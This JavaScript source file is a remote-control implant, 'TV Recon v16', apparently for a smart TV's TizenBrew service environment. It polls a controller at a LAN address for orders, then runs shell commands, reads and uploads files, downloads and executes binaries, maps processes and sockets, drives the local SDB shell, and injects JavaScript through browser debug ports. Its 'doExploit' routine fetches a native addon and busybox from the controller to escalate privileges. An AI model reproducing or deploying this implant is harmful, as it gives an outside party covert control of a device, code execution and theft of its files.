/* TV Recon v16 — LONG-LIVED RESIDENT AGENT.
 * Runs in the TizenBrew service vm context. No crash markers, no throws —
 * a single resident module with a polling loop. Orders from /mode:
 *   {"action":"recon"}   light status posts
 *   {"action":"exec","cmd":"..."}   run command, post output
 *   {"action":"stop"}    idle (no posts)
 * ES5. Every callback wrapped — an async throw would kill the whole service. */
'use strict';

var MAC = '192.168.86.86';
var PORT = 8080;
var fs = require('fs');
var http = require('http');

var lastModeStr = '';
var executedNonces = {};
var busy = false;

var AGENT_ID = T(function () { return fs.readFileSync('/proc/self/cmdline', 'utf8').split(' ')[0]; }) + ':' + process.pid;
function post(tag, data) {
    try {
        var body = JSON.stringify({ tag: tag, agent: AGENT_ID, data: data });
        if (body.length > 400000) body = JSON.stringify({ tag: tag, data: '(too big)' });
        var req = http.request({
            host: MAC, port: PORT, path: '/report', method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
        });
        req.on('error', function () {});
        req.end(body);
    } catch (e) {}
}
function T(fn) { try { return fn(); } catch (e) { return 'ERR:' + (e && e.message ? e.message : String(e)); } }
function read(f, n) { return T(function () { return fs.readFileSync(f, 'utf8').slice(0, n || 6000); }); }
function ls(d) { return T(function () { return fs.readdirSync(d).slice(0, 250); }); }

console.log('TV Recon v16 resident agent starting');
post('v16-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });

function getMode(cb) {
    try {
        var req = http.request({ host: MAC, port: PORT, path: '/mode', method: 'GET' }, function (res) {
            var b = '';
            res.on('data', function (c) { b += c; });
            res.on('end', function () {
                try { cb(JSON.parse(b)); } catch (e) { cb(null); }
            });
        });
        req.on('error', function () { cb(null); });
        req.end();
    } catch (e) { cb(null); }
}

var seenOnce = {};
function once(key, fn) { if (!seenOnce[key]) { seenOnce[key] = true; fn(); } }

function doRecon(mode) {
    /* one-time full map (delivered once per service lifetime), then light status */
    once('net', function () {
        post('net-unix', read('/proc/net/unix', 12000));
        post('net-tcp', read('/proc/net/tcp', 6000));
        post('net-udp', read('/proc/net/udp', 3000));
    });
    once('writable', function () {
        var wr = {};
        ['/tmp', '/home/owner/share/tmp/sdk_tools', '/home/owner/share/tmp', '/home/owner',
         '/dev/shm', '/run/user/5001', '/opt/usr/home/owner', '/home/owner/data',
         '/home/owner/content', '/home/owner/.cache', '/home/owner/apps_rw'].forEach(function (d) {
            wr[d] = T(function () { var t = d + '/.__tvr'; fs.writeFileSync(t, '1'); fs.unlinkSync(t); return 'WRITE_OK'; });
        });
        post('writable', wr);
    });
    once('dirs', function () {
        ['/opt/etc', '/usr/share/chromium-efl/upgrade', '/var', '/usr/lib/systemd/system',
         '/etc/systemd/system', '/run/user/5001', '/opt/usr/apps/xvvl3S1bvH',
         '/opt/usr/apps', '/var/cynara', '/var/lib', '/etc/sysmgr'].forEach(function (d) {
            post('fs', { dir: d, listing: ls(d) });
        });
    });
    once('marker', function () {
        post('native-marker-unconditional', read('/tmp/.nativenow', 2000));
    });
    once('smack', function () {
        post('smack-load2', read('/sys/fs/smackfs/load2', 16000));
    });
    if (mode.deep) {
        /* full procmap only on demand */
        once('procmap', function () {
            var pids = T(function () { return fs.readdirSync('/proc').filter(function (x) { return /^[0-9]+$/.test(x); }); });
            var procs = [];
            if (pids instanceof Array) {
                for (var k = 0; k < pids.length; k++) {
                    var pid = pids[k];
                    var s = T(function () { return fs.readFileSync('/proc/' + pid + '/status', 'utf8'); });
                    if (typeof s !== 'string') continue;
                    var name = (s.match(/^Name:\s*(.*)/m) || [0, '?'])[1];
                    var uid = (s.match(/^Uid:\s*(\d+)/m) || [0, '?'])[1];
                    if (uid !== '0' && uid !== '5001') continue;
                    if (name && /^(kworker|migration|ksoftirqd|watchdog|rcu_|kthrotld|irq|mmc_|scsi_|zswap|loop|nfit|bioset|kblockd)/.test(name)) continue;
                    var cmd = T(function () { return fs.readFileSync('/proc/' + pid + '/cmdline', 'utf8').replace(/\0/g, ' ').slice(0, 130); });
                    procs.push({ pid: pid, name: name, uid: uid, cmd: cmd });
                    if (procs.length >= 220) break;
                }
            }
            for (var c = 0; c < procs.length; c += 25) {
                post('procs', { chunk: c / 25, total: procs.length, list: procs.slice(c, c + 25) });
            }
        });
    }
    post('heartbeat', { t: new Date().toISOString(), busy: busy });
}

function doExec(mode) {
    if (busy) { post('exec-busy', true); return; }
    busy = true;
    try {
        var cp = require('child_process');
        post('exec-start', { cmd: mode.cmd });
        cp.exec(mode.cmd, { timeout: 20000, maxBuffer: 600000 }, function (err, stdout, stderr) {
            try {
                var out = String(stdout || '');
                var errS = String(stderr || '');
                var CH = 3500, i;
                for (i = 0; i < out.length; i += CH) post('exec-out', { i: i / CH, s: out.slice(i, i + CH) });
                for (i = 0; i < errS.length; i += CH) post('exec-err', { i: i / CH, s: errS.slice(i, i + CH) });
                post('exec-done', {
                    rc: err ? (err.code !== undefined ? err.code : String(err)) : 0,
                    outLen: out.length, errLen: errS.length
                });
            } catch (e) { post('exec-post-fail', String(e)); }
            busy = false;
        });
    } catch (e) {
        post('exec-fail', String(e));
        busy = false;
    }
}

function doSpawn(mode) {
    if (busy) { post('spawn-busy', true); return; }
    busy = true;
    try {
        var cp = require('child_process');
        var args = mode.args || [];
        post('spawn-start', { file: mode.file, args: args });
        var child = cp.spawn(mode.file, args, { timeout: 20000 });
        var out = '', errS = '';
        child.stdout.on('data', function (d) { out += d.toString(); });
        child.stderr.on('data', function (d) { errS += d.toString(); });
        child.on('error', function (e) {
            post('spawn-done', { err: String(e), code: e && e.code, outLen: out.length, errLen: errS.length });
            post('spawn-out', { s: out.slice(0, 3500) });
            post('spawn-err', { s: errS.slice(0, 3500) });
            busy = false;
        });
        child.on('close', function (code) {
            post('spawn-out', { s: out.slice(0, 3500) });
            post('spawn-err', { s: errS.slice(0, 3500) });
            post('spawn-done', { code: code, outLen: out.length, errLen: errS.length });
            busy = false;
        });
    } catch (e) {
        post('spawn-fail', String(e));
        busy = false;
    }
}

function doWritefile(mode) {
    try {
        post('fetch-start', { url: mode.url, path: mode.path, mode: mode.mode });
        var req = http.request(mode.url, function (res) {
            var chunks = [];
            res.on('data', function (c) { chunks.push(c); });
            res.on('end', function () {
                try {
                    var buf = Buffer.concat(chunks);
                    fs.writeFileSync(mode.path, buf);
                    if (mode.mode) fs.chmodSync(mode.path, mode.mode);
                    post('fetch-done', { bytes: buf.length, path: mode.path });
                } catch (e) { post('fetch-fail', 'write: ' + String(e)); }
            });
        });
        req.on('error', function (e) { post('fetch-fail', String(e)); });
        req.end();
    } catch (e) { post('fetch-fail', String(e)); }
}

function doReadfile(mode) {
    try {
        var content = read(mode.path, mode.max || 60000);
        var s = String(content);
        var CH = 3500;
        for (var i = 0; i < s.length; i += CH) {
            post('readfile-out', { path: mode.path, i: i / CH, total: Math.ceil(s.length / CH), s: s.slice(i, i + CH) });
        }
        post('readfile-done', { path: mode.path, len: s.length });
    } catch (e) { post('readfile-err', String(e)); }
}

function doDlopentest(mode) {
    try {
        var src = mode.lib || '/usr/lib/libc.so.6';
        fs.copyFileSync(src, '/tmp/t.node');
        post('dlopentest-copied', { lib: src, size: T(function () { return fs.statSync('/tmp/t.node').size; }) });
        try {
            var m = require('/tmp/t.node');
            post('dlopentest-loaded', { keys: T(function () { return Object.keys(m); }) });
        } catch (e2) {
            post('dlopentest-err', String(e2));
        }
    } catch (e) { post('dlopentest-outer-err', String(e)); }
}

function doLsdir(mode) {
    try {
        var entries = T(function () { return fs.readdirSync(mode.path); });
        post('lsdir-out', { path: mode.path, entries: entries });
    } catch (e) { post('lsdir-err', { path: mode.path, err: String(e) }); }
}

function doNread(mode) {
    /* non-blocking device/file read: O_NONBLOCK, drain until EAGAIN. Safe for /dev/kmsg */
    try {
        var fd = fs.openSync(mode.path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
        var chunks = [];
        var buf = new Buffer(16384);
        var total = 0;
        var limit = mode.max || 262144;
        while (total < limit) {
            var n;
            try { n = fs.readSync(fd, buf, 0, buf.length, null); }
            catch (e) { break; } /* EAGAIN etc. */
            if (n <= 0) break;
            chunks.push(buf.slice(0, n));
            total += n;
        }
        fs.closeSync(fd);
        var s = Buffer.concat(chunks).toString('utf8');
        var CH = 3500;
        for (var i = 0; i < s.length; i += CH) {
            post('nread-out', { path: mode.path, i: i / CH, total: Math.ceil(s.length / CH), s: s.slice(i, i + CH) });
        }
        post('nread-done', { path: mode.path, len: s.length });
    } catch (e) { post('nread-err', { path: mode.path, err: String(e) }); }
}

function doRead64(mode) {
    /* binary-safe read -> base64 chunks (offset+length supported) */
    try {
        var fd = fs.openSync(mode.path, 'r');
        var start = mode.offset || 0;
        var len = mode.len || 65536;
        var buf = new Buffer(len);
        var n = fs.readSync(fd, buf, 0, len, start);
        fs.closeSync(fd);
        var b64 = buf.slice(0, n).toString('base64');
        var CH = 3500;
        for (var i = 0; i < b64.length; i += CH) {
            post('read64-out', { path: mode.path, offset: start, n: n, i: i / CH, s: b64.slice(i, i + CH) });
        }
        post('read64-done', { path: mode.path, offset: start, n: n });
    } catch (e) { post('read64-err', { path: mode.path, err: String(e) }); }
}

function doNetprobe(mode) {
    /* raw socket prober: TCP or UNIX; send bytes (hex or utf8); capture reply */
    try {
        var net = require('net');
        var isUnix = !!mode.unix;
        var opts = isUnix ? { path: mode.unix } : { host: mode.host || '127.0.0.1', port: mode.port };
        var sock = net.connect(opts);
        var out = '';
        var done = false;
        var finish = function (tag, extra) {
            if (done) return;
            done = true;
            var CH = 3500;
            for (var i = 0; i < out.length; i += CH) {
                post('netprobe-out', { target: isUnix ? mode.unix : (mode.host + ':' + mode.port), i: i / CH, s: out.slice(i, i + CH), b64: mode.b64 });
            }
            post('netprobe-done', { target: isUnix ? mode.unix : (mode.host + ':' + mode.port), len: out.length, extra: extra || null });
            try { sock.destroy(); } catch (e) {}
        };
        var timer = setTimeout(function () { finish('timeout'); }, mode.timeout || 4000);
        sock.setTimeout(mode.timeout || 4000, function () { finish('timeout'); });
        sock.on('connect', function () {
            try {
                if (mode.sendHex) sock.write(new Buffer(mode.sendHex, 'hex'));
                if (mode.send) sock.write(mode.send);
            } catch (e) { finish('senderr:' + e); }
        });
        sock.on('data', function (d) {
            if (mode.b64) out += d.toString('base64');
            else out += d.toString('utf8');
            if (out.length > 65536) { clearTimeout(timer); finish('maxlen'); }
        });
        sock.on('error', function (e) { clearTimeout(timer); finish('error:' + e.code); });
        sock.on('close', function () { clearTimeout(timer); finish('closed'); });
    } catch (e) { post('netprobe-err', { err: String(e) }); }
}

function doFdscan(mode) {
    /* map every listening socket to its owning process */
    try {
        var tcp = T(function () { return fs.readFileSync('/proc/net/tcp', 'utf8'); });
        var tcp6 = T(function () { return fs.readFileSync('/proc/net/tcp6', 'utf8'); });
        var unixS = T(function () { return fs.readFileSync('/proc/net/unix', 'utf8'); });
        var listeners = [];
        (String(tcp) + '\n' + String(tcp6)).split('\n').forEach(function (line) {
            var m = line.trim().split(/\s+/);
            if (m.length < 10) return;
            if (m[3] !== '0A') return;
            var port = parseInt(m[1].split(':')[1], 16);
            listeners.push({ proto: 'tcp', port: port, inode: m[9] });
        });
        String(unixS).split('\n').forEach(function (line) {
            var m = line.trim().split(/\s+/);
            if (m.length < 8) return;
            var path = m.slice(7).join(' ');
            if (!path) return;
            listeners.push({ proto: 'unix', path: path, inode: m[6] });
        });
        post('fdscan-listeners', { count: listeners.length, list: listeners.slice(0, 150) });
        var pids = T(function () { return fs.readdirSync('/proc').filter(function (x) { return /^[0-9]+$/.test(x); }); });
        var inodeMap = {};
        var scanned = 0;
        if (pids instanceof Array) {
            pids.forEach(function (pid) {
                var fds = T(function () { return fs.readdirSync('/proc/' + pid + '/fd'); });
                if (!(fds instanceof Array)) return;
                fds.forEach(function (fd) {
                    var target = T(function () { return fs.readlinkSync('/proc/' + pid + '/fd/' + fd); });
                    var mm = String(target).match(/^socket:\[(\d+)\]$/);
                    if (mm) { if (!inodeMap[mm[1]]) inodeMap[mm[1]] = pid; scanned++; }
                });
            });
        }
        post('fdscan-inodes', { scanned: scanned, unique: Object.keys(inodeMap).length });
        var joined = [];
        listeners.forEach(function (L) {
            var pid = inodeMap[L.inode] || '?';
            var name = '?';
            if (pid !== '?') {
                name = T(function () {
                    var s = fs.readFileSync('/proc/' + pid + '/status', 'utf8');
                    var nm = s.match(/^Name:\s*(.*)/m);
                    var uid = s.match(/^Uid:\s*(\d+)/m);
                    return (nm ? nm[1] : '?') + ' (uid' + (uid ? uid[1] : '?') + ')';
                });
            }
            joined.push({ t: L.proto, port: L.port || 0, path: L.path || '', pid: pid, name: name });
        });
        var CH = 40;
        for (var c = 0; c < joined.length; c += CH) {
            post('fdscan-map', { chunk: c / CH, total: joined.length, list: joined.slice(c, c + CH) });
        }
    } catch (e) { post('fdscan-err', String(e)); }
}

function doUnitmap(mode) {
    /* read all .service units, extract Description + ExecStart */
    try {
        var dir = '/usr/lib/systemd/system';
        var files = T(function () { return fs.readdirSync(dir); });
        if (!(files instanceof Array)) { post('unitmap-err', String(files)); return; }
        var units = files.filter(function (f) { return f.indexOf('.service') !== -1; });
        var out = [];
        units.forEach(function (u) {
            var c = T(function () { return fs.readFileSync(dir + '/' + u, 'utf8'); });
            if (typeof c !== 'string') return;
            var d = c.match(/Description=(.*)/);
            var e = c.match(/ExecStart=(.*)/);
            if (e) out.push({ unit: u.slice(0, -8), desc: d ? d[1].slice(0, 90) : '', exec: e[1].trim().slice(0, 120) });
        });
        var CH = 25;
        for (var i = 0; i < out.length; i += CH) {
            post('unitmap', { chunk: i / CH, total: Math.ceil(out.length / CH), list: out.slice(i, i + CH) });
        }
        post('unitmap-done', { units: units.length, mapped: out.length });
    } catch (e) { post('unitmap-err', String(e)); }
}

function doGrepdir(mode) {
    /* stateful dir sweep: each tick processes a batch of files, resumes next tick.
     * mode: {action:'grepdir', dir:'/usr/bin', patterns:['A00F','EB1F','8823','8C3C'], maxsize: 2000000, batch: 40}
     * patterns are hex of LITTLE-ENDIAN u16 port constants. */
    try {
        var stateFile = '/tmp/.grepdir_' + String(mode.dir).replace(/\//g, '_');
        var st = null;
        if (fs.existsSync(stateFile)) {
            st = JSON.parse(fs.readFileSync(stateFile, 'utf8'));
        }
        if (!st || st.dir !== mode.dir) {
            var files = T(function () { return fs.readdirSync(mode.dir); });
            if (!(files instanceof Array)) { post('grepdir-err', String(files)); return; }
            st = { dir: mode.dir, files: files, idx: 0, matches: 0, pats: mode.patterns, maxsize: mode.maxsize || 2000000, batch: mode.batch || 40 };
        }
        var maxread = st.maxsize;
        var n = 0;
        while (st.idx < st.files.length && n < st.batch) {
            var f = st.files[st.idx]; st.idx++;
            var p = st.dir + '/' + f;
            var sz = T(function () { return fs.statSync(p).size; });
            if (typeof sz !== 'number' || sz === 0 || sz > maxread) continue;
            if (T(function () { return fs.statSync(p).isDirectory(); }) === true) continue;
            var data = T(function () { return fs.readFileSync(p); });
            if (!(data instanceof Buffer)) continue;
            for (var pi = 0; pi < st.pats.length; pi++) {
                var pat = new Buffer(st.pats[pi], 'hex');
                var at = data.indexOf(pat);
                if (at !== -1) {
                    var ctx = data.slice(Math.max(0, at - 24), at + 26);
                    post('grepdir-hit', { file: p, pattern: st.pats[pi], at: at, ctx: ctx.toString('base64') });
                    st.matches++;
                }
            }
            n++;
        }
        fs.writeFileSync(stateFile, JSON.stringify(st));
        if (st.idx >= st.files.length) {
            post('grepdir-done', { dir: st.dir, files: st.files.length, matches: st.matches });
            try { fs.unlinkSync(stateFile); } catch (e) {}
        } else {
            post('grepdir-progress', { dir: st.dir, done: st.idx, total: st.files.length, matches: st.matches });
        }
    } catch (e) { post('grepdir-err', String(e)); }
}

function doProcscan(mode) {
    /* ALL processes, no uid filter */
    try {
        var pids = T(function () { return fs.readdirSync('/proc').filter(function (x) { return /^[0-9]+$/.test(x); }); });
        var procs = [];
        if (pids instanceof Array) {
            for (var k = 0; k < pids.length; k++) {
                var pid = pids[k];
                var s = T(function () { return fs.readFileSync('/proc/' + pid + '/status', 'utf8'); });
                if (typeof s !== 'string') continue;
                var name = (s.match(/^Name:\s*(.*)/m) || [0, '?'])[1];
                var uid = (s.match(/^Uid:\s*(\d+)/m) || [0, '?'])[1];
                if (mode.uid && String(mode.uid) !== uid) continue;
                var cmd = T(function () { return fs.readFileSync('/proc/' + pid + '/cmdline', 'utf8').replace(/\0/g, ' ').slice(0, 130); });
                procs.push({ pid: pid, name: name, uid: uid, cmd: cmd });
                if (procs.length >= 400) break;
            }
        }
        var CH = 30;
        for (var c = 0; c < procs.length; c += CH) {
            post('procscan', { chunk: c / CH, total: Math.ceil(procs.length / CH), uid: mode.uid || 'all', list: procs.slice(c, c + CH) });
        }
        post('procscan-done', { count: procs.length });
    } catch (e) { post('procscan-err', String(e)); }
}

/* ---- minimal SDB (ADB-protocol) client over net ---- */
function sdbConnect(cb) {
    var net = require('net');
    var sock = net.connect(26101, '127.0.0.1');
    sock.setTimeout(10000);
    sock.on('timeout', function () { post('sdbdbg', { stage: 'timeout' }); try { sock.destroy(); } catch (e) {} cb('ERR:timeout', null); });
    sock.on('error', function (e) { post('sdbdbg', { stage: 'error', err: String(e) }); cb('ERR:' + e.message, null); });
    sock.on('connect', function () {
        post('sdbdbg', { stage: 'connected' });
        /* CNXN packet: "CNXN" ver maxdata payload */
        var payload = new Buffer('host::\0', 'ascii');
        var pkt = new Buffer(24 + payload.length);
        pkt.write('CNXN', 0, 'ascii');
        pkt.writeUInt32LE(0x01000000, 4);
        pkt.writeUInt32LE(4096, 8);
        pkt.writeUInt32LE(payload.length, 12);
        pkt.writeUInt32LE(0, 16);
        pkt.writeUInt32LE((0xFFFFFFFF ^ 0x4E584E43) >>> 0, 20);
        payload.copy(pkt, 24);
        sock.write(pkt);
        /* skip the daemon's CNXN response, then ready */
        var buf = new Buffer(0);
        sock.on('data', function first(d) {
            buf = Buffer.concat([buf, d]);
            post('sdbdbg', { stage: 'data', len: buf.length, hex: buf.slice(0, 48).toString('hex') });
            if (buf.length >= 24) {
                sock.removeListener('data', first);
                cb(null, sock);
            }
        });
    });
    return sock;
}

function sdbShell(cmd, cb) {
    var sock = sdbConnect(function (err, s) {
        if (err) { cb(err, ''); return; }
        var svc = new Buffer('shell:0 ' + cmd + '\0', 'ascii');
        var open = new Buffer(24 + svc.length);
        open.write('OPEN', 0, 'ascii');
        open.writeUInt32LE(1, 4);   /* local id */
        open.writeUInt32LE(0, 8);
        open.writeUInt32LE(svc.length, 12);
        open.writeUInt32LE(0, 16);
        open.writeUInt32LE((0xFFFFFFFF ^ 0x4E504F) >>> 0, 20);
        svc.copy(open, 24);
        s.write(open);
        var out = '';
        var done = false;
        s.on('data', function (d) {
            /* strip protocol tokens crudely */
            var t = d.toString('latin1');
            out += t;
            if (out.length > 40000 && !done) { done = true; s.destroy(); cb(null, out); }
        });
        s.on('close', function () { if (!done) { done = true; cb(null, out); } });
        s.on('timeout', function () { if (!done) { done = true; s.destroy(); cb(null, out); } });
    });
}

function doSdbshell(mode) {
    try {
        post('sdbshell-start', { cmd: mode.cmd });
        sdbShell(mode.cmd, function (err, out) {
            post('sdbshell-done', { cmd: mode.cmd, err: err ? String(err) : null, out: String(out).slice(0, 20000) });
        });
    } catch (e) { post('sdbshell-err', String(e)); }
}

/* ---- minimal WebSocket client + CDP Runtime.evaluate ---- */
function doCdp(mode) {
    try {
        var crypto = require('crypto');
        var http = require('http');
        var key = crypto.randomBytes(16).toString('base64');
        var path = mode.path || '/';
        var req = http.request({
            host: '127.0.0.1', port: mode.port, path: path,
            headers: {
                'Connection': 'Upgrade', 'Upgrade': 'websocket',
                'Sec-WebSocket-Key': key, 'Sec-WebSocket-Version': '13'
            }
        });
        req.on('upgrade', function (res, socket, head) {
            var sendFrame = function (obj) {
                var payload = new Buffer(JSON.stringify(obj), 'utf8');
                var mask = crypto.randomBytes(4);
                var header;
                if (payload.length < 126) {
                    header = new Buffer([0x81, 0x80 | payload.length]);
                } else {
                    header = new Buffer(4);
                    header[0] = 0x81; header[1] = 0x80 | 126;
                    header.writeUInt16BE(payload.length, 2);
                }
                var masked = new Buffer(payload.length);
                for (var i = 0; i < payload.length; i++) masked[i] = payload[i] ^ mask[i % 4];
                socket.write(Buffer.concat([header, mask, masked]));
            };
            var parseBuf = new Buffer(0);
            socket.on('data', function (d) {
                parseBuf = Buffer.concat([parseBuf, d]);
                while (parseBuf.length >= 2) {
                    var len = parseBuf[1] & 0x7F;
                    var off = 2;
                    if (len === 126) { if (parseBuf.length < 4) return; len = parseBuf.readUInt16BE(2); off = 4; }
                    else if (len === 127) { if (parseBuf.length < 10) return; len = parseBuf.readUInt32BE(6); off = 10; }
                    if (parseBuf.length < off + len) return;
                    var payload = parseBuf.slice(off, off + len);
                    parseBuf = parseBuf.slice(off + len);
                    try {
                        var msg = JSON.parse(payload.toString('utf8'));
                        if (msg.id === 1) {
                            post('cdp-result', { port: mode.port, result: JSON.stringify(msg.result || msg.error).slice(0, 8000) });
                            socket.destroy();
                        }
                    } catch (e) {}
                }
            });
            setTimeout(function () { sendFrame({ id: 1, method: 'Runtime.evaluate', params: { expression: mode.js, returnByValue: true } }); }, 300);
            setTimeout(function () { post('cdp-timeout', { port: mode.port }); try { socket.destroy(); } catch (e) {} }, mode.timeout || 8000);
        });
        req.on('error', function (e) { post('cdp-err', { stage: 'http', err: String(e) }); });
        req.end();
    } catch (e) { post('cdp-err', { stage: 'outer', err: String(e) }); }
}

function doExploit(mode) {
    /* Choreographed escalation train, one boot:
     * 1. download N-API addon  2. require() it  3. read constructor marker
     * 4. call probe()          5. download busybox  6. spawn busybox id (may kill)
     */
    if (busy) { post('exploit-busy', true); return; }
    busy = true;
    post('exploit-start', { step: 'fetch-addon' });
    try {
        var req = http.request('http://' + MAC + ':' + PORT + '/files/addon.node', function (res) {
            var chunks = [];
            res.on('data', function (c) { chunks.push(c); });
            res.on('end', function () {
                try {
                    var buf = Buffer.concat(chunks);
                    var target = mode.path || '/tmp/x.node';
                    fs.writeFileSync(target, buf);
                    post('exploit-addon-saved', { bytes: buf.length });
                    /* THE MOMENT: dlopen via require() */
                    var addon = require(target);
                    post('exploit-addon-loaded', { typeOf: typeof addon, keys: T(function () { return Object.keys(addon); }) });
                    /* constructor should have written the marker */
                    var marker = read('/tmp/.nativenow', 2000);
                    post('exploit-native-marker', marker);
                    if (addon && addon.probe) {
                        post('exploit-probe', T(function () { return String(addon.probe()); }));
                    }
                    /* step 2: busybox upload */
                    var req2 = http.request('http://' + MAC + ':' + PORT + '/files/busybox', function (res2) {
                        var chunks2 = [];
                        res2.on('data', function (c) { chunks2.push(c); });
                        res2.on('end', function () {
                            try {
                                var buf2 = Buffer.concat(chunks2);
                                fs.writeFileSync('/tmp/bb', buf2);
                                fs.chmodSync('/tmp/bb', 493);
                                post('exploit-busybox-saved', { bytes: buf2.length });
                                /* step 3: spawn test — the potentially lethal one, LAST */
                                var cp = require('child_process');
                                post('exploit-spawn-start', {});
                                var child = cp.spawn('/tmp/bb', ['id'], { timeout: 15000 });
                                var out = '', errS = '';
                                child.stdout.on('data', function (d) { out += d.toString(); });
                                child.stderr.on('data', function (d) { errS += d.toString(); });
                                child.on('error', function (e) {
                                    post('exploit-spawn-done', { err: String(e), code: e && e.code, out: out.slice(0, 2000), errS: errS.slice(0, 1000) });
                                    busy = false;
                                });
                                child.on('close', function (code) {
                                    post('exploit-spawn-done', { code: code, out: out.slice(0, 2000), errS: errS.slice(0, 1000) });
                                    busy = false;
                                });
                            } catch (e) {
                                post('exploit-busybox-err', String(e));
                                busy = false;
                            }
                        });
                    });
                    req2.on('error', function (e) { post('exploit-busybox-err', 'fetch: ' + String(e)); busy = false; });
                    req2.end();
                } catch (e) {
                    post('exploit-addon-err', String(e));
                    busy = false;
                }
            });
        });
        req.on('error', function (e) { post('exploit-addon-err', 'fetch: ' + String(e)); busy = false; });
        req.end();
    } catch (e) {
        post('exploit-outer-err', String(e));
        busy = false;
    }
}

function tick() {
    try {
        getMode(function (mode) {
            try {
                if (!mode || !mode.action) { mode = { action: 'recon' }; }
                var ms = JSON.stringify(mode);
                if (ms !== lastModeStr) {
                    lastModeStr = ms;
                    post('mode', mode);
                }
                /* ONE-SHOT: nonce guard — skip dispatch but ALWAYS reschedule */
                var nonce = mode.nonce || null;
                var alreadyRan = false;
                if (nonce) {
                    if (executedNonces[nonce]) { alreadyRan = true; }
                    else {
                        /* cross-agent file lock in shared /tmp */
                        var lock = '/tmp/.lock_' + nonce;
                        try {
                            fs.openSync(lock, 'wx');
                            executedNonces[nonce] = 1;
                        } catch (e) { alreadyRan = true; }
                    }
                }
                if (!alreadyRan) {
                if (mode.action === 'readfile') doReadfile(mode);
                else if (mode.action === 'lsdir') doLsdir(mode);
                else if (mode.action === 'nread') doNread(mode);
                else if (mode.action === 'read64') doRead64(mode);
                else if (mode.action === 'netprobe') doNetprobe(mode);
                else if (mode.action === 'fdscan') doFdscan(mode);
                else if (mode.action === 'unitmap') doUnitmap(mode);
                else if (mode.action === 'grepdir') doGrepdir(mode);
                else if (mode.action === 'procscan') doProcscan(mode);
                else if (mode.action === 'sdbshell') doSdbshell(mode);
                else if (mode.action === 'cdp') doCdp(mode);
                else if (mode.action === 'dlopentest') doDlopentest(mode);
                else if (mode.action === 'exec') doExec(mode);
                else if (mode.action === 'spawn') doSpawn(mode);
                else if (mode.action === 'writefile') doWritefile(mode);
                else if (mode.action === 'exploit') doExploit(mode);
                else if (mode.action === 'die') { post('dying', true); setTimeout(function () { throw new Error('UPDATE_RESTART'); }, 100); }
                else if (mode.action === 'stop') { /* idle */ }
                else doRecon(mode);
                }
            } catch (e) { post('tick-err', String(e)); }
            setTimeout(tick, 5000);
        });
    } catch (e) {
        try { post('tick-outer-err', String(e)); } catch (e2) {}
        setTimeout(tick, 5000);
    }
}
tick();

/* keep the vm context alive forever — never throw */
